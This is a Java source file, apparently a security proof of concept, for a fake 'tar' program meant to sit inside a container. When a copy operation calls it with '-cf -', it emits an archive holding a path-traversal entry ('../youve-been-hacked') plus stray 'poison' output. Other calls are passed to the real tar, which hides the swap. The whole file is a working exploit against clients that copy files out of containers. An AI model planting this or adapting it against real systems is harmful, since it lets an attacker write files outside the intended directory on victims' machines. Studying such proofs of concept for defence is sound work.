package com.marcnuri.infosec;

import io.quarkus.runtime.annotations.QuarkusMain;
import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
import org.zeroturnaround.exec.ProcessExecutor;

import java.io.File;

@QuarkusMain
public class Application {

  public static void main(String... args) throws Exception {
    if (args.length > 2 && args[0].equals("-cf") && args[1].equals("-")) {
      try (TarArchiveOutputStream taos = new TarArchiveOutputStream(System.out)) {
        taos.putArchiveEntry(
          taos.createArchiveEntry(
            new File("../youve-been-hacked"), "../youve-been-hacked"));
        taos.closeArchiveEntry();
      }
      // Poison me
      System.out.println("Hello");
    } else {
      final String[] command = new String[args.length + 1];
      command[0] = "tar-original";
      System.arraycopy(args, 0, command, 1, args.length);
      new ProcessExecutor()
        .command(command)
        .redirectOutput(System.out)
        .redirectError(System.err)
        .execute();
    }
  }
}
